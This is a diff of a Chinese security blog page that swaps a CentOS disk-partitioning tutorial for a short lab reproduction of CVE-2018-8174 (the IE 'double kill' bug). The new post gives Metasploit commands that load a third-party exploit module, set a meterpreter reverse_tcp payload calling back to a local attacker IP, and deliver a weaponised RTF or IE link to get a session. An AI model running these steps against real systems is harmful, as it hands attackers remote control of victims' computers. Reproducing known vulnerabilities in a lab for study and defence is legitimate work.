@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="运维," />
+  <meta name="keywords" content="Web安全," />
 
 
 
@@ -81,32 +81,18 @@
 
 
 
-<meta name="keywords" content="运维">
+<meta name="keywords" content="Web安全">
 <meta property="og:type" content="article">
-<meta property="og:title" content="centos7初始化硬盘分区、挂载">
-<meta property="og:url" content="http://yoursite.com/2018/08/26/“centos7-初始化硬盘分区、挂载/index.html">
+<meta property="og:title" content="CVE-2018-8174 双杀漏洞复现">
+<meta property="og:url" content="http://yoursite.com/2018/09/04/双杀漏洞复现/index.html">
 <meta property="og:site_name" content="Secer">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://yoursite.com/images/pasted-135.png">
-<meta property="og:image" content="http://yoursite.com/images/pasted-137.png">
-<meta property="og:image" content="http://yoursite.com/images/pasted-138.png">
-<meta property="og:image" content="http://yoursite.com/images/pasted-139.png">
-<meta property="og:image" content="http://yoursite.com/images/pasted-140.png">
-<meta property="og:image" content="http://yoursite.com/images/pasted-141.png">
-<meta property="og:image" content="http://yoursite.com/images/pasted-142.png">
-<meta property="og:image" content="http://yoursite.com/images/pasted-143.png">
-<meta property="og:image" content="http://yoursite.com/images/pasted-144.png">
-<meta property="og:image" content="http://yoursite.com/images/pasted-145.png">
-<meta property="og:image" content="http://yoursite.com/images/pasted-146.png">
-<meta property="og:image" content="http://yoursite.com/images/pasted-147.png">
-<meta property="og:image" content="http://yoursite.com/images/pasted-148.png">
-<meta property="og:image" content="http://yoursite.com/images/pasted-150.png">
-<meta property="og:image" content="http://yoursite.com/images/pasted-149.png">
-<meta property="og:image" content="http://yoursite.com/images/pasted-151.png">
-<meta property="og:updated_time" content="2018-08-26T14:57:37.988Z">
+<meta property="og:image" content="http://yoursite.com/images/pasted-220.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-219.png">
+<meta property="og:updated_time" content="2018-09-14T12:19:24.711Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="centos7初始化硬盘分区、挂载">
-<meta name="twitter:image" content="http://yoursite.com/images/pasted-135.png">
+<meta name="twitter:title" content="CVE-2018-8174 双杀漏洞复现">
+<meta name="twitter:image" content="http://yoursite.com/images/pasted-220.png">
 
 
 
@@ -136,13 +122,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/08/26/“centos7-初始化硬盘分区、挂载/"/>
+  <link rel="canonical" href="http://yoursite.com/2018/09/04/双杀漏洞复现/"/>
 
 
 
 
 
-  <title>centos7初始化硬盘分区、挂载 | Secer</title>
+  <title>CVE-2018-8174 双杀漏洞复现 | Secer</title>
   
 
 
@@ -279,7 +265,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/08/26/“centos7-初始化硬盘分区、挂载/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/04/双杀漏洞复现/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="shiqian">
@@ -296,7 +282,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">centos7初始化硬盘分区、挂载</h1>
+          <h1 class="post-title" itemprop="name headline">CVE-2018-8174 双杀漏洞复现</h1>
         
 
         <div class="post-meta">
@@ -308,8 +294,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-08-26T21:30:05+08:00">
-                2018-08-26
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-04T13:33:05+08:00">
+                2018-09-04
               </time>
             
 
@@ -331,8 +317,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/运维/" itemprop="url" rel="index">
-                    <span itemprop="name">运维</span>
+                  <a href="/categories/web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">web安全</span>
                   </a>
                 </span>
 
@@ -371,34 +357,14 @@
         <hr>
 <a id="more"></a>
 <p>繁华一场梦</p>
-<p><img src="\images\pasted-135.png" alt="upload successful"></p>
-<h2 id="linux硬盘知识："><a href="#linux硬盘知识：" class="headerlink" title="linux硬盘知识："></a>linux硬盘知识：</h2><p>linux下硬盘设备名为（IDE硬盘为hdx（x为从a—d）因为IDE硬盘最多四个，SCSI，SATA，USB硬盘为sdx（x为a—z）），硬盘主分区最多为4个.所以主分区从sdb1开始到sdb4，其中sdb4为扩展分区，逻辑分区从sdb5开始，（逻辑分区永远从sdb5开始…）设备名可以使用fdisk –l查看</p>
-<h2 id="开始分区"><a href="#开始分区" class="headerlink" title="开始分区"></a>开始分区</h2><h4 id="1-查看新增磁盘信息"><a href="#1-查看新增磁盘信息" class="headerlink" title="1.查看新增磁盘信息"></a>1.查看新增磁盘信息</h4><p> <code>lsblk</code></p>
-<p><img src="\images\pasted-137.png" alt="upload successful"></p>
-<h4 id="2-查看分区信息"><a href="#2-查看分区信息" class="headerlink" title="2.查看分区信息"></a>2.查看分区信息</h4><p><code>fdisk -l</code></p>
-<p><img src="\images\pasted-138.png" alt="upload successful"></p>
-<h4 id="3-将sdb分区，键入m获取帮助"><a href="#3-将sdb分区，键入m获取帮助" class="headerlink" title="3.将sdb分区，键入m获取帮助"></a>3.将sdb分区，键入m获取帮助</h4><p><img src="\images\pasted-139.png" alt="upload successful"></p>
-<h4 id="4-键入n添加新的分区"><a href="#4-键入n添加新的分区" class="headerlink" title="4.键入n添加新的分区"></a>4.键入n添加新的分区</h4><p>p表示主分区，e表示扩展分区</p>
-<p><img src="\images\pasted-140.png" alt="upload successful"></p>
-<h4 id="5-创建主分区"><a href="#5-创建主分区" class="headerlink" title="5.创建主分区"></a>5.创建主分区</h4><p><img src="\images\pasted-141.png" alt="upload successful"><br>第一条红框处按回车就好了，第二条红框处，我想设2G的一个空间，键入+2G</p>
-<p>继续设置第二个主分区大小2G，第三个主分区大小3G</p>
-<p><img src="\images\pasted-142.png" alt="upload successful"></p>
-<h4 id="6-创建扩展分区"><a href="#6-创建扩展分区" class="headerlink" title="6.创建扩展分区"></a>6.创建扩展分区</h4><p>创建第四个分区为扩展分区</p>
-<p><img src="\images\pasted-143.png" alt="upload successful"></p>
-<h4 id="7-创建逻辑分区"><a href="#7-创建逻辑分区" class="headerlink" title="7.创建逻辑分区"></a>7.创建逻辑分区</h4><p>创建第五个分区为逻辑分区</p>
-<p><img src="\images\pasted-144.png" alt="upload successful"><br>完成后一定要w进行写入磁盘并退出，否则上面的操作将白费</p>
-<p><img src="\images\pasted-145.png" alt="upload successful"></p>
-<h2 id="对分区操作"><a href="#对分区操作" class="headerlink" title="对分区操作"></a>对分区操作</h2><h4 id="1-查看分区情况"><a href="#1-查看分区情况" class="headerlink" title="1.查看分区情况"></a>1.查看分区情况</h4><p><img src="\images\pasted-146.png" alt="upload successful"></p>
-<h4 id="2-删除分区"><a href="#2-删除分区" class="headerlink" title="2.删除分区"></a>2.删除分区</h4><p>删除分区5即逻辑分区</p>
-<p><img src="\images\pasted-147.png" alt="upload successful"></p>
-<h4 id="3-格式化分区"><a href="#3-格式化分区" class="headerlink" title="3.格式化分区"></a>3.格式化分区</h4><p>首先查看文件类型  df -hT<br><code>mkfs -t ext4 /dev/sdb</code></p>
-<p><img src="\images\pasted-148.png" alt="upload successful"></p>
-<h2 id="挂载磁盘"><a href="#挂载磁盘" class="headerlink" title="挂载磁盘"></a>挂载磁盘</h2><h4 id="临时挂载"><a href="#临时挂载" class="headerlink" title="临时挂载"></a>临时挂载</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /data/gz</span><br><span class="line">mount /dev/sdb /data/gz</span><br><span class="line">df -hT</span><br></pre></td></tr></table></figure>
-<p><img src="\images\pasted-150.png" alt="upload successful"><br>取消挂载就是umount<br>这种方式只临时挂载到/opt目录下，下次开机时不会自动挂载<br>注意：挂载后/opt目录下的文件会被临时删除，注意备份</p>
-<h4 id="开机自动挂载"><a href="#开机自动挂载" class="headerlink" title="开机自动挂载"></a>开机自动挂载</h4><p>1.查询磁盘分区的UUID    <code>blkid /dev/sdb</code></p>
-<p><img src="\images\pasted-149.png" alt="upload successful"></p>
-<p>2.通过vim编辑<code>vim /etc/fstab/</code><br><code>UUID=870d929c-dbce-40c8-9e9e-f1933a6f422c /data/gz ext4</code><br>保存<br>3.重启，查看 <code>df-hT</code></p>
-<p><img src="\images\pasted-151.png" alt="upload successful"><br>自动挂载成功</p>
+<p><img src="\images\pasted-220.png" alt="upload successful"></p>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">最近360核心安全事业部高级威胁应对团队在全球范围内率先监控到了一例使用0day漏洞的APT攻击，捕获到了全球首例利用浏览器0day漏洞的新型Office文档攻击，我们将该漏洞命名为“双杀”漏洞。该漏洞影响最新版本的IE浏览器及使用了IE内核的应用程序。用户在浏览网页或打开Office文档时都可能中招，最终被黑客植入后门木马完全控制电脑</span><br></pre></td></tr></table></figure>
+<h2 id="metasploit-复现"><a href="#metasploit-复现" class="headerlink" title="metasploit 复现"></a>metasploit 复现</h2><h4 id="下载-metasploit-模块到本地"><a href="#下载-metasploit-模块到本地" class="headerlink" title="下载 metasploit 模块到本地"></a>下载 metasploit 模块到本地</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/0x09AL/CVE-2018-8174-msf.git</span><br></pre></td></tr></table></figure>
+<h4 id="将CVE-2018-8174-rb复制到-fileformat-目录"><a href="#将CVE-2018-8174-rb复制到-fileformat-目录" class="headerlink" title="将CVE-2018-8174.rb复制到 fileformat 目录"></a>将CVE-2018-8174.rb复制到 fileformat 目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp CVE-2018-8174.rb /usr/share/metasploit-framework/modules/exploits/windows/fileformat/</span><br></pre></td></tr></table></figure>
+<h4 id="将CVE-2018-8174-rtf复制到-exploits-目录"><a href="#将CVE-2018-8174-rtf复制到-exploits-目录" class="headerlink" title="将CVE-2018-8174.rtf复制到 exploits 目录"></a>将CVE-2018-8174.rtf复制到 exploits 目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp CVE-2018-8174.rtf /usr/share/metasploit-framework/data/exploits/</span><br></pre></td></tr></table></figure>
+<h4 id="启动-metasploit"><a href="#启动-metasploit" class="headerlink" title="启动 metasploit"></a>启动 metasploit</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/fileformat/CVE-2018-8174</span><br><span class="line">set PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line">set srvhost 192.168.0.116</span><br><span class="line">set lhost 192.168.0.116</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+<p><img src="\images\pasted-219.png" alt="upload successful"></p>
+<p>复制 /root/.msf4/local/目录中的 msf.rtf 文件到目标主机上使用word文档打开<br>或者IE浏览器打开 <a href="http://192.168.0.116:8080" target="_blank" rel="noopener">http://192.168.0.116:8080</a> 即可获得会话</p>
 
       
     </div>
@@ -426,7 +392,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/运维/" rel="tag"># 运维</a>
+            <a href="/tags/Web安全/" rel="tag"># Web安全</a>
           
         </div>
       
@@ -439,8 +405,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/08/26/python写网络爬虫/" rel="next" title="抓取数据的方式">
-                <i class="fa fa-chevron-left"></i> 抓取数据的方式
+              <a href="/2018/09/03/等保-安全通用要求/" rel="next" title="等保-安全通用要求">
+                <i class="fa fa-chevron-left"></i> 等保-安全通用要求
               </a>
             
           </div>
@@ -449,8 +415,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2018/08/27/SQL注入绕过/" rel="prev" title="SQL注入绕过">
-                SQL注入绕过 <i class="fa fa-chevron-right"></i>
+              <a href="/2018/09/04/万能密码原理/" rel="prev" title="万能密码原理">
+                万能密码原理 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -590,7 +556,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#linux硬盘知识："><span class="nav-number">1.</span> <span class="nav-text">linux硬盘知识：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#开始分区"><span class="nav-number">2.</span> <span class="nav-text">开始分区</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-查看新增磁盘信息"><span class="nav-number">2.0.1.</span> <span class="nav-text">1.查看新增磁盘信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-查看分区信息"><span class="nav-number">2.0.2.</span> <span class="nav-text">2.查看分区信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-将sdb分区，键入m获取帮助"><span class="nav-number">2.0.3.</span> <span class="nav-text">3.将sdb分区，键入m获取帮助</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-键入n添加新的分区"><span class="nav-number">2.0.4.</span> <span class="nav-text">4.键入n添加新的分区</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-创建主分区"><span class="nav-number">2.0.5.</span> <span class="nav-text">5.创建主分区</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6-创建扩展分区"><span class="nav-number">2.0.6.</span> <span class="nav-text">6.创建扩展分区</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#7-创建逻辑分区"><span class="nav-number">2.0.7.</span> <span class="nav-text">7.创建逻辑分区</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#对分区操作"><span class="nav-number">3.</span> <span class="nav-text">对分区操作</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-查看分区情况"><span class="nav-number">3.0.1.</span> <span class="nav-text">1.查看分区情况</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-删除分区"><span class="nav-number">3.0.2.</span> <span class="nav-text">2.删除分区</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-格式化分区"><span class="nav-number">3.0.3.</span> <span class="nav-text">3.格式化分区</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#挂载磁盘"><span class="nav-number">4.</span> <span class="nav-text">挂载磁盘</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#临时挂载"><span class="nav-number">4.0.1.</span> <span class="nav-text">临时挂载</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#开机自动挂载"><span class="nav-number">4.0.2.</span> <span class="nav-text">开机自动挂载</span></a></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#metasploit-复现"><span class="nav-number">2.</span> <span class="nav-text">metasploit 复现</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#下载-metasploit-模块到本地"><span class="nav-number">2.0.1.</span> <span class="nav-text">下载 metasploit 模块到本地</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#将CVE-2018-8174-rb复制到-fileformat-目录"><span class="nav-number">2.0.2.</span> <span class="nav-text">将CVE-2018-8174.rb复制到 fileformat 目录</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#将CVE-2018-8174-rtf复制到-exploits-目录"><span class="nav-number">2.0.3.</span> <span class="nav-text">将CVE-2018-8174.rtf复制到 exploits 目录</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#启动-metasploit"><span class="nav-number">2.0.4.</span> <span class="nav-text">启动 metasploit</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
